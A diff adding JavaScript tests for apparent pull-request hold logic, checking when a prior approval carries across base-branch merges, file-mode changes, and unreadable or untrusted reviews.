+    "a base branch that does not resolve to a commit": { tip: "main" },
+    "an unreadable base ref": { fail: "/git/ref/" },
+    // A dismissed approval with no stale-dismissal event never counts.
+    "an approval later dismissed": { reviews: [review("DISMISSED", OLD)] },
+    "an approval followed by a request for changes on another head": { reviews: [review("APPROVED", OLD), review("CHANGES_REQUESTED", "8".repeat(40), "2026-10-27T23:40:00Z")] },
+    "an approval by a person off the trusted-actor list": { reviews: [review("APPROVED", OLD, APPROVED_AT, 77)] },
+    "an approval by a bot account": { reviews: [review("APPROVED", OLD, APPROVED_AT, 5, "Bot")] },
+    "unreadable reviews": { fail: "/reviews?" },
+    "an unreadable pull request": { fail: "/pulls/99" },
+    "an unreadable compare": { fail: "/compare/" },
+  };
+  for (const [name, options] of Object.entries(cases)) {
+    const run = await lifting(liftWorld(options));
+    assert.equal(run.code, 1, `${name}: ${run.out}`);
+    assert.match(run.out, HOLD_REASON, name);
+  }
+});
+
+test("an approval carried over a base merge lifts no verifier hold, and an exact-head approval in the discussion needs no reads", async () => {
+  const carried = await lifting(liftWorld(), { queue: true });
+  assert.equal(carried.code, 1, carried.out);
+  assert.match(carried.out, /lifts its hold path/);
+  assert.match(carried.out, /pr-verify has not passed this head/);
+  assert.match(carried.out, /its pr-verify FAILs could not be read/);
+  const world = liftWorld();
+  const exact = await lifting(world, { reviews: [review("APPROVED", HEAD)] });
+  assert.equal(exact.code, 0, exact.out);
+  assert.deepEqual(world.reads, []);
+});
+
+// The independent security review of #10671: the compare API reports no
+// file mode, so the exact path reads the head's and its merge base's trees and
+// requires each brought file's mode to be the base's; and the carry runs only
+// on a base that is the repository's default branch.
+test("the exact carry reads file modes from the trees, and a non-default base carries nothing", async () => {
+  const flipped = FILES_AT.map(([path]) => [path, path === "docs/base.md" ? "100755" : "100644"]);
+  const heldFlip = FILES_AT.map(([path]) => [path, path === SHARED_AT_OLD.filename ? "100755" : "100644"]);
+  for (const [name, options] of Object.entries({
+    "a merge that also flips a base file's mode": { ...REPLAY, modes: trees(treeOf(flipped)) },
+    "a merge that flips the mode of a file both sides changed": { ...REPLAY, modes: trees(treeOf(heldFlip)) },
+    "a brought file missing from the head's tree": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
+    "a brought file missing from both trees": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md")), treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
+    "a brought file missing from the base's tree": { ...REPLAY, modes: trees(undefined, treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
+    "a truncated head tree": { ...REPLAY, modes: trees(treeOf(FILES_AT, { truncated: true })) },
+    "a base tree with no truncated flag": { ...REPLAY, modes: trees(undefined, { tree: treeOf(FILES_AT).tree }) },
+    "an unreadable tree": { ...REPLAY, fail: "/git/trees/" },
+    "an exact carry into a base that is not the default branch": { ...REPLAY, base: "release" },
+    "a same-net-change carry into a base that is not the default branch": { base: "release" },
+    "an unreadable repository": { defaultBranch: null },
+  })) {
+    const run = await lifting(liftWorld(options));
+    assert.equal(run.code, 1, `${name}: ${run.out}`);
+    assert.match(run.out, HOLD_REASON, name);
+  }
+  // A removed base file is absent from both trees, and that carries.
+  const removed = { filename: "docs/gone.md", status: "removed", patch: "@@ -1 +0,0 @@\n-x" };
+  const world = liftWorld({ ...REPLAY, across: ranges(brought([BASE_DOC, SHARED_BASE, removed]), baseRange([BASE_DOC, SHARED_BASE, removed])) });
+  const run = await lifting(world);
+  assert.equal(run.code, 0, run.out);
+  assert.ok(world.reads.includes(`/repos/owner/repo/git/trees/${HEAD}?recursive=1`) && world.reads.includes(`/repos/owner/repo/git/trees/${MB_HEAD}?recursive=1`), world.reads.join(" "));
+  // An approval of the head itself needs no default-branch read.
+  const exact = liftWorld({ base: "release", reviews: [review("APPROVED", HEAD)] });
+  assert.equal((await lifting(exact, { reviews: [] })).code, 0);
+});
+
+test("baseMergesOnly and baseMergeCarry read their inputs strictly", () => {
+  const then = { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 };
+  const inBase = new Set([MAIN]);
+  assert.equal(baseMergesOnly(then, merged([]), OLD, inBase), true);
+  assert.equal(baseMergesOnly(then, merged([]), OLD), false);
+  assert.deepEqual(mergedParents(then, merged([])), [MAIN]);
+  assert.equal(baseMergesOnly(then, { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] }, OLD, inBase), false);
+  assert.equal(baseMergesOnly(then, merged([]), "9".repeat(40), inBase), false);
+  // The whole net change decides: any file the merge changes differently.
+  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELPER, HELD_PATCH]), OLD, [MAIN]), true);
+  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELD_PATCH, { ...HELPER, patch: "+z" }]), OLD, [MAIN]), false);
+  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH, HELPER]), OLD, [MAIN]), false);
+  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH]), OLD, []), false);
+});
+
+test("exactBaseCarry, approvalCarry and autoDismissed read their inputs strictly", () => {
+  const { approvalCarry, autoDismissed, exactBaseCarry } = holdsModule;
+  // Both directions: the base's files equal what the merges brought, and
+  // each brought file has the base's mode in the head's tree.
+  const same = [treeOf(FILES_AT), treeOf(FILES_AT)];
+  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC]), same), true);
+  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])), false);
+  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC, SHARED_BASE]), same), false);
+  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC]), same), false);
+  // A base that did not move: nothing brought, nothing changed.
+  assert.equal(exactBaseCarry(brought([]), { status: "identical", behind_by: 0, files: [], commits: [], total_commits: 0 }, same), true);
+  assert.equal(exactBaseCarry(brought(), null, same), false);
+  assert.equal(exactBaseCarry(brought(undefined, { behind_by: undefined }), baseRange(), same), false);
+  assert.equal(exactBaseCarry(brought(undefined, { commits: undefined }), baseRange(), same), false);
+  // The compare API reports no file mode, so a merge that also flips a base
+  // file's mode lists as the base's changes alone; the trees show it.
+  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md", "100755"]]), treeOf([["docs/base.md"]])]), false);
+  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md"]], { truncated: true }), treeOf([["docs/base.md"]])]), false);
+  // A file the base removed is in neither tree.
+  const gone = { filename: "docs/gone.md", status: "removed", patch: "-x" };
+  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), same), true);
+  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), [treeOf([["docs/gone.md"]]), treeOf([])]), false);
+  // A renamed file's old path is in neither tree.
+  const moved = { ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" };
+  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), same), true);
+  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), [treeOf([...FILES_AT, ["docs/old.md"]]), treeOf(FILES_AT)]), false);
+  const [then, now] = [atOld([HELD_PATCH, SHARED_AT_OLD]), merged([HELD_PATCH, SHARED_AT_HEAD])];
+  const [merges, based] = [brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE])];
+  const modes = [treeOf(FILES_AT), treeOf(FILES_AT)];
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, null, modes), true);
+  assert.equal(approvalCarry(then, now, OLD, [], merges, based, null, modes), false);
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], null, null, null, modes), false);
+  // The exact path needs both trees; the same net change needs neither.
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based), false);
+  assert.equal(approvalCarry(atOld(), merged([HELD_PATCH]), OLD, [MAIN], null, null), true);
+  // A restored approval carries only when its dismissal commit is one the
+  // merges pushed since the approved head.
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, HEAD, modes), true);
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OLD, modes), false);
+  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OTHER, modes), false);
+  assert.deepEqual([...autoDismissed([STALE, { event: "reviewed" }, null])], [["41", HEAD]]);
+  assert.deepEqual([...autoDismissed([STALE, stale({ dismissal_message: "x" })])], []);
+  assert.deepEqual([...autoDismissed("not a list")], []);
 });
